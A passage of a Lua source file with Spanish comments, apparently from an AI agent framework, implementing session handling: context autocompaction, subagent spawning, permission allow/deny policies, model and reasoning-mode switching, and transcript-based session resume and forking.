    text = "[Resumen de la conversación previa]\n" .. text } } }
end

-- Session:_maybe_autocompact() (P25). Si el último `usage.input_tokens` del
-- proveedor (fuente de verdad, providers.md §5) rebasa el umbral configurable
-- (defecto 80% del `context` del modelo), compacta automáticamente. El umbral
-- depende de conocer la ventana de contexto (del providers.toml): sin ella, no
-- dispara. Tras compactar, `_last_input_tokens` se limpia (no re-dispara).
function Session:_maybe_autocompact()
  local tokens = self._last_input_tokens
  local window = self.context_window
  if tokens == nil or type(window) ~= "number" or window <= 0 then
    return
  end
  if tokens > self.compact_threshold * window then
    self:compact({ auto = true })
  end
end

-- Session:spawn(opts) -> Sub (agente.md §9). Lanza un SUBAGENTE: un agente que
-- corre AISLADO y devuelve a este (su padre) un resultado DIGERIDO. Delega en el
-- módulo `subagent` (cableado al final de este fichero con `subagent.attach(M)`).
-- opts = los de agent.session + { worker? = false, caps?: string[] }.
function Session:spawn(opts)
  if self.closed then
    eagent("la sesión está cerrada")
  end
  return M._subagent.spawn(self, opts)
end

-- M.run_tool_proxy(session, call) -> tool_result. Corre UNA tool por el pipeline
-- COMPLETO (permisos → hooks → handler → tool_result) sobre `session` (agente.md
-- §9). Es lo que el PADRE invoca cuando un subagente-worker proxya una tool: la
-- ejecución ocurre SIEMPRE en el estado principal, bajo el pipeline centralizado
-- (el worker no puede saltárselo). Devuelve el bloque tool_result canónico
-- (JSON-able: cruza al worker). Reusa `run_tool`, idéntico al del turno (§2 paso 5).
function M.run_tool_proxy(session, call)
  return run_tool(session, call)
end

-- Session:set_model(model) cambio en caliente (agente.md §2 G19). Valida contra el
-- registro de providers (resolve lanza si no existe) y aplica desde el siguiente
-- request. Escribe una entrada `event` en el transcript (sesiones.md §3).
function Session:set_model(model)
  if type(model) ~= "string" or model == "" then
    einval("Session:set_model espera \"proveedor/modelo\"")
  end
  providers.resolve(model) -- valida; lanza EPROVIDER si no existe
  self.model = model
  if self.store then
    self.store:append({ t = "event", ns = "agent", data = { kind = "set_model", model = model } })
  end
end

-- Session:set_thinking(value) cambia el control de razonamiento de la sesión en
-- caliente (ADR-016, agente.md §2). `value`: una tabla `{ mode?, budget? }`, una
-- cadena de modo ("off"|"adaptive"|"budget"), o nil (= off). Aplica desde el
-- siguiente request (como set_model: nunca a mitad de un stream). Escribe una
-- entrada `event` en el transcript.
function Session:set_thinking(value)
  self.thinking = normalize_thinking(value)
  if self.store then
    self.store:append({ t = "event", ns = "agent",
      data = { kind = "set_thinking", thinking = self.thinking } })
  end
  return self
end

-- Session:thinking_mode() -> "off"|"adaptive"|"budget" el modo de razonamiento
-- vigente (para mostrarlo en la UI; chat /think y statusline). "off" si no hay.
function Session:thinking_mode()
  return (self.thinking and self.thinking.mode) or "off"
end

-- Session:allow(pattern) añade `pattern` a la política `allow` de ESTA sesión en
-- caliente (agente.md §5 / chat.md §5 "permitir siempre", P29). Aplica desde la
-- siguiente comprobación de permiso. Idempotente (no duplica).
function Session:allow(pattern)
  if type(pattern) ~= "string" or pattern == "" then
    einval("Session:allow espera un patrón (string no vacío)")
  end
  local allow = self.permissions.allow
  for _, p in ipairs(allow) do
    if p == pattern then return self end
  end
  allow[#allow + 1] = pattern
  if self.store then
    self.store:append({ t = "event", ns = "agent", data = { kind = "allow", pattern = pattern } })
  end
  return self
end

-- Session:deny(pattern) añade `pattern` a la política `deny` de la sesión en
-- caliente (chat.md §4 `/permissions`, P28). El `deny` corta el pipeline (§5).
function Session:deny(pattern)
  if type(pattern) ~= "string" or pattern == "" then
    einval("Session:deny espera un patrón (string no vacío)")
  end
  local deny = self.permissions.deny
  for _, p in ipairs(deny) do
    if p == pattern then return self end
  end
  deny[#deny + 1] = pattern
  if self.store then
    self.store:append({ t = "event", ns = "agent", data = { kind = "deny", pattern = pattern } })
  end
  return self
end

-- Session:set_permission_mode(mode) cambia el modo de permisos ("ask"|"auto") en
-- caliente (chat.md §4 `/permissions`, P28).
function Session:set_permission_mode(mode)
  if mode ~= "ask" and mode ~= "auto" then
    einval("Session:set_permission_mode espera \"ask\" o \"auto\"")
  end
  self.permissions.mode = mode
  return self
end

-- Session:permissions_view() -> { mode, allow, deny } copia de la política de la
-- sesión, para mostrarla (chat.md §4 `/permissions`, P28).
function Session:permissions_view()
  local p = self.permissions
  local function copy(t)
    local out = {}
    for i, v in ipairs(t or {}) do out[i] = v end
    return out
  end
  return { mode = p.mode, allow = copy(p.allow), deny = copy(p.deny) }
end

-- Session:close() libera la sesión de almacenamiento (suelta el lock, sesiones.md
-- §6). Idempotente.
function Session:close()
  if self.closed then
    return
  end
  self.closed = true
  emit(self.handle.id, "session.end", {})
  if self.store then
    self.store:close()
  end
end

-- ---------------------------------------------------------------------------
-- agent.session (agente.md §2).
-- ---------------------------------------------------------------------------

-- agent.session(opts) -> Session (agente.md §2). Crea o reanuda una sesión. opts:
--   - model (string, requerido salvo agent.toml `model`): "proveedor/modelo".
--   - system?, cwd?, tools?: string[], permissions?, resume?, max_turns?, etc.
--   - no_store? (S39): NO persistir (test in-memory). Por defecto persiste.
-- Persiste vía la extensión `sessions` (S38): crea/reanuda el transcript JSONL y
-- adquiere el lock de escritor. Reanudar (resume) hace replay del transcript y
-- repuebla el historial en memoria (agente.md §2 G18).
function M.session(opts)
  opts = opts or {}
  if type(opts) ~= "table" then
    einval("agent.session espera una tabla de opciones")
  end

  local cfg = load_config()
  local model = opts.model or cfg.model
  if type(model) ~= "string" or model == "" then
    einval("agent.session requiere `model` (\"proveedor/modelo\") en opts o en agent.toml")
  end
  -- Valida el modelo pronto (resolve lanza EPROVIDER si el provider/adaptador no
  -- existe): mejor fallar al abrir que en el primer turno. Aprovecha para conocer
  -- la ventana de contexto del modelo (del providers.toml), que el disparo de
  -- autocompactación (P25) necesita.
  local resolved0 = providers.resolve(model)
  local context_window = resolved0.config.model and resolved0.config.model.context

  local cwd = opts.cwd or enu.fs.cwd()

  -- Almacenamiento (agente.md §2 paso 1; sesiones.md). En S39 se persiste salvo
  -- `no_store` (tests in-memory). Reanudar pasa `resume` a sessions.open.
  local store = nil
  if opts.no_store ~= true then
    store = sessions.open({
      cwd     = cwd,
      resume  = opts.resume,
      parent  = opts.parent,
    })
  end

  -- tools_for_request: las ToolDef (name/description/schema) que se pasan al
  -- provider (agente.md §3). `opts.tools` (string[]) limita el conjunto; sin él,
  -- todas las registradas. Si la lista queda vacía, no se pasan tools.
  local tools_for_request = nil
  do
    local available = {}
    for _, t in pairs(tools) do
      available[t.name] = t
    end
    local chosen = {}
    if type(opts.tools) == "table" then
      for _, tn in ipairs(opts.tools) do
        if available[tn] then
          chosen[#chosen + 1] = available[tn]
        end
      end
    else
      for _, t in pairs(available) do
        -- La tool interna `skill` (P24) NO entra en el conjunto por defecto: solo
        -- se ofrece a las sesiones que tienen skills (se añade tras descubrirlas).
        if t.name ~= "skill" then
          chosen[#chosen + 1] = t
        end
      end
    end
    if #chosen > 0 then
      tools_for_request = {}
      for _, t in ipairs(chosen) do
        tools_for_request[#tools_for_request + 1] =
          { name = t.name, description = t.description, schema = t.schema }
      end
    end
  end

  -- Config de compactación (agente.md §8, P25): umbral (fracción del contexto) y
  -- modelo del resumen. Orden: opts < agent.toml [compact] < default (0.8 / el
  -- modelo de la sesión).
  local compact_cfg = cfg.compact or {}
  local compact_threshold = opts.compact_threshold or compact_cfg.threshold or 0.8
  local compact_model = opts.compact_model or compact_cfg.model

  -- Control de razonamiento de la sesión (ADR-016, agente.md §2/§10): el modo por
  -- defecto de `thinking` que llevará cada request. Orden: opts.thinking (si se
  -- dio, aunque sea "off") < agent.toml [thinking]. `Session:set_thinking` lo
  -- cambia en caliente.
  local thinking
  if opts.thinking ~= nil then
    thinking = normalize_thinking(opts.thinking)
  else
    thinking = normalize_thinking(cfg.thinking)
  end

  local self = setmetatable({
    model            = model,
    opts             = opts,
    cwd              = cwd,
    store            = store,
    history          = {},
    permissions      = normalize_permissions(opts.permissions, cfg),
    max_turns        = opts.max_turns or cfg.max_turns or DEFAULT_MAX_TURNS,
    -- Reintentos de la apertura del stream (G42): precedencia estándar §10.
    max_retries      = opts.max_retries or cfg.max_retries or DEFAULT_MAX_RETRIES,
    retry_base_ms    = opts.retry_base_ms or cfg.retry_base_ms or DEFAULT_RETRY_BASE_MS,
    max_tokens       = opts.max_tokens,
    temperature      = opts.temperature,
    thinking         = thinking,
    tools_for_request = tools_for_request,
    closed           = false,
    usage            = { context_tokens = 0, cost_usd = 0, turns = 0 },
    -- Reentrada (G4/P23) y cancelación (P22): la cola de `send`, los que esperan
    -- el mensaje final, y el estado del turno en vuelo.
    queue            = {},
    waiters          = {},
    turn_active      = false,
    turn_task        = nil,
    -- Compactación (P25): la ventana de contexto y la política de disparo.
    context_window   = context_window,
    compact_threshold = compact_threshold,
    compact_model    = compact_model,
  }, Session)

  -- El handle público expuesto a hooks/ctx/eventos: id + usage (agente.md §2).
  self.handle = {
    id = (store and store.id) or ("mem-" .. tostring(self)),
    usage = self.usage,
  }
  self.id = self.handle.id

  -- Reanudación (agente.md §2 G18): replay del transcript → repuebla el historial
  -- en memoria con los mensajes (la política de replay para el LLM —tomar el
  -- último compact y los message siguientes— vive aquí, no en la persistencia).
  if store and opts.resume then
    local entries = store:replay()
    local last_compact = 0
    for i, e in ipairs(entries) do
      if e.t == "compact" then
        last_compact = i
      end
    end
    for i = (last_compact > 0 and last_compact or 1), #entries do
      local e = entries[i]
      if e.t == "message" and type(e.message) == "table" then
        table.insert(self.history, e.message)
      elseif e.t == "compact" and type(e.summary) == "table" then
        table.insert(self.history, e.summary)
      end
    end

    -- G46: el replay reaplica también los `event` del agente — la sesión reanudada
    -- continúa DONDE ESTABA, no donde arrancó. Precedencia (agente.md §2): opts
    -- explícitos del resume > event del transcript > agent.toml — los opts siguen
    -- siendo efímeros *cuando se dan*; cuando callan, el transcript manda. Se
    -- recorre TODO el transcript, no solo desde el último compact (la compactación
    -- resume mensajes, no configuración): para los repetibles la última gana
    -- (sesiones.md §3) y los acumulativos allow/deny se reaplican en orden sobre la
    -- política base, con la misma semántica que en caliente (idempotentes) y sin
    -- re-persistir nada (el replay lee, no escribe).
    local last_model, saw_thinking, last_thinking
    local function readd(list, pattern)
      if type(pattern) ~= "string" or pattern == "" then return end
      for _, p in ipairs(list) do
        if p == pattern then return end
      end
      list[#list + 1] = pattern
    end
    for _, e in ipairs(entries) do
      if e.t == "event" and e.ns == "agent" and type(e.data) == "table" then
        local k = e.data.kind
        if k == "set_model" and type(e.data.model) == "string" then
          last_model = e.data.model
        elseif k == "set_thinking" then
          saw_thinking, last_thinking = true, e.data.thinking
        elseif k == "allow" then
          readd(self.permissions.allow, e.data.pattern)
        elseif k == "deny" then
          readd(self.permissions.deny, e.data.pattern)
        end
      end
    end
    if last_model ~= nil and opts.model == nil then
      -- Como Session:set_model: valida contra el registro. Si el provider
      -- desapareció desde que se grabó, EPROVIDER al abrir (mejor que en el
      -- primer turno); el escape es un opts.model explícito, que tiene precedencia.
      providers.resolve(last_model)
      self.model = last_model
    end
    if saw_thinking and opts.thinking == nil then
      self.thinking = normalize_thinking(last_thinking)
    end
  end

  -- Fork (P22, Session:fork): copia el prefijo del padre al historial y al
  -- transcript del hijo (el `meta.parent` ya lo escribió sessions.open con
  -- `opts.parent`). El hijo queda autocontenido (sesiones.md §5).
  if type(opts._fork_prefix) == "table" then
    for _, m in ipairs(opts._fork_prefix) do
      table.insert(self.history, m)
      if self.store then
        self.store:append_message(m)
      end
    end
  end

  -- Descubrimiento de skills + enu.md del repo (P24). Se captura UNA vez al abrir;
  -- la INCLUSIÓN en el system prompt la decide la confianza (TOFU §11.2) en cada
  -- ensamblado. `opts.skills` (string[]) limita el índice visible (§6).
  do
    local user_skills, repo_skills = {}, {}
    discover_skills_in(enu.config.dir() .. "/skills", "user", user_skills)
    discover_skills_in(cwd .. "/.enu/skills", "repo", repo_skills)
    if type(opts.skills) == "table" then
      local allow = {}
      for _, n in ipairs(opts.skills) do allow[n] = true end
      local function keep(list)
        local out = {}
        for _, s in ipairs(list) do if allow[s.name] then out[#out + 1] = s end end
        return out
      end
      user_skills = keep(user_skills)
      repo_skills = keep(repo_skills)
    end
    self._user_skills = user_skills
    self._repo_skills = repo_skills
    local okmd, md = pcall(enu.fs.read, cwd .. "/enu.md")
    if okmd and type(md) == "string" then self._nu_md = md end
  end

  -- Ofrece la tool `skill` (P24) solo si la sesión tiene skills visibles.
  if self:_has_skills() and tools["skill"] ~= nil then
    self.tools_for_request = self.tools_for_request or {}
    local present = false
    for _, td in ipairs(self.tools_for_request) do
      if td.name == "skill" then present = true break end
    end
    if not present then
      local st = tools["skill"]
      self.tools_for_request[#self.tools_for_request + 1] =
        { name = st.name, description = st.description, schema = st.schema }
    end
  end

  -- self.model, no el local: un resume pudo reaplicar un set_model del transcript (G46).
  emit(self.handle.id, "session.start", { model = self.model })
  return self
end

-- ---------------------------------------------------------------------------
-- Subagentes (agente.md §9, S40). Se cablea al final, cuando `M` (con `session`,
-- `run_tool_proxy`, `caps`) ya está completo: `subagent.attach(M)` inyecta el
-- módulo `agent` en el de subagentes (evita un require circular) y expone
-- `M._subagent.spawn`, que usa `Session:spawn`.
-- ---------------------------------------------------------------------------
M._subagent = require("agent.subagent").attach(M)

return M
